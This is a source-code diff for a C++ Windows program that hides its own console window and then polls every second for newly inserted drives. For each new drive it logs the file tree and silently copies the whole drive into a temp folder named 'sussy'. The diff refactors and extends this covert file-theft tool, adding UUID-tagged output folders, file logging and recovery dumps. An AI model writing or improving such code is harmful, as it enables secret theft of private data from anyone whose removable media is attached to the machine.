@@ -1,31 +1,66 @@
-#include <Windows.h>
+#include "UUID.hpp"
 #include <bitset>
+#include <chrono>
 #include <filesystem>
+#include <fstream>
+#include <spdlog/sinks/basic_file_sink.h>
+#include <spdlog/spdlog.h>
 #include <sstream>
+#include <thread>
 
-i8 get_new_drive_letter(u32);
-void copy_files(i8);
+#ifdef PLATFORM_WINDOWS
+    #include <Windows.h>
+#endif
 
-static u32 s_current_drives{0};
+using std::bitset;
+namespace fs = std::filesystem;
+
+i8 get_new_drive_letter(bitset<32>);
+fs::path path_from_letter(i8);
+void copy_files(fs::path drive_path, fs::path out_path);
+void dump_tree(fs::path in_path, fs::path out_file);
+bitset<32> get_devices();
+void initialize_logger();
+
+static bitset<32> s_current_drives{0};
+const static fs::path work_dir = fs::temp_directory_path() / "sussy";
+Ref<spdlog::logger> logger;
 
 int main() {
 
+#ifdef PLATFORM_WINDOWS
     HWND hWnd = GetConsoleWindow();
     ShowWindow(hWnd, SW_HIDE);
+#endif
 
-    s_current_drives = GetLogicalDrives();
+    fs::create_directories(work_dir);
+    initialize_logger();
+
+    s_current_drives = get_devices();
+
+    logger->info("Init was successful, starting now.");
 
     while (true) {
-        Sleep(1000);
+        using namespace std::chrono_literals;
+        std::this_thread::sleep_for(1s);
 
-        std::cout << "Looking for new drives..." << std::endl;
+        logger->info("Looking for devices...");
 
-        u32 new_drives = GetLogicalDrives();
+        auto new_drives = get_devices();
         if (new_drives != s_current_drives) {
             i8 letter = get_new_drive_letter(new_drives);
             if (letter != 0) {
-                std::cout << letter << ":\\ was found!" << std::endl;
-                copy_files(letter);
+                UUID uuid;
+                logger->warn("{}:\\ was found! Assigned uuid is {}", letter,
+                             uuid);
+                auto drive_path = path_from_letter(letter);
+                fs::path out_path = work_dir / uuid.ToString();
+                fs::create_directories(out_path);
+
+                logger->info("Dumping tree");
+                dump_tree(drive_path, out_path / "tree_dump.txt");
+
+                copy_files(drive_path, out_path);
             }
 
             s_current_drives = new_drives;
@@ -35,16 +70,12 @@ int main() {
     return 0;
 }
 
-i8 get_new_drive_letter(u32 new_drives) {
-    std::bitset<32> old_bits = s_current_drives;
-    std::bitset<32> new_bits = new_drives;
+i8 get_new_drive_letter(bitset<32> new_drives) {
+    for (size_t i = 0; i < s_current_drives.size(); i++) {
 
-
-    for (int i = 0; i < old_bits.size(); i++) {
-
-        if (old_bits[i] != new_bits[i]) {
+        if (s_current_drives[i] != new_drives[i]) {
             // Check if device was removed and not inserted
-            if (new_bits[i] == 0)
+            if (new_drives[i] == 0)
                 return 0;
 
             return (i8)('A' + i);
@@ -53,20 +84,46 @@ i8 get_new_drive_letter(u32 new_drives) {
     return 0;
 }
 
+void dump_tree(fs::path in_path, fs::path out_file) {
+    std::ofstream dump(out_file);
 
-void copy_files(i8 letter) {
-    namespace fs = std::filesystem;
-    auto temp_path = fs::temp_directory_path();
-    auto out_path = temp_path / "sussy";
+    for (const fs::directory_entry &entry :
+         fs::recursive_directory_iterator(in_path)) {
 
-    std::cout << "Copying to " << out_path << std::endl;
+        if (entry.is_regular_file())
+            dump << entry.path() << std::endl;
+    }
+}
 
-    fs::create_directories(out_path);
+void copy_files(fs::path drive_path, fs::path out_path) {
+    logger->info("Copying to {}", out_path.string());
 
+    try {
+        fs::copy(drive_path, out_path, fs::copy_options::recursive);
+        logger->info("Done!");
+    } catch (...) {
+        logger->error("Copy was interrupted, trying to save progress");
+        auto out_file = out_path / "recovery_dump.txt";
+        dump_tree(out_path, out_file);
+        logger->info("Progress was saved to {}", out_file.string());
+    }
+}
+
+bitset<32> get_devices() {
+#ifdef PLATFORM_WINDOWS
+    return GetLogicalDrives();
+#else
+    // Just make it compile
+    return 0;
+#endif
+}
+
+void initialize_logger() {
+    logger = spdlog::basic_logger_st("logger", work_dir / "log.txt");
+}
+
+fs::path path_from_letter(i8 letter) {
     std::stringstream ss;
     ss << letter << ":\\";
-    auto input_path = fs::path(ss.str());
-
-    fs::copy(input_path, out_path, fs::copy_options::recursive);
-    std::cout << "Done!" << std::endl;
+    return fs::path(ss.str());
 }
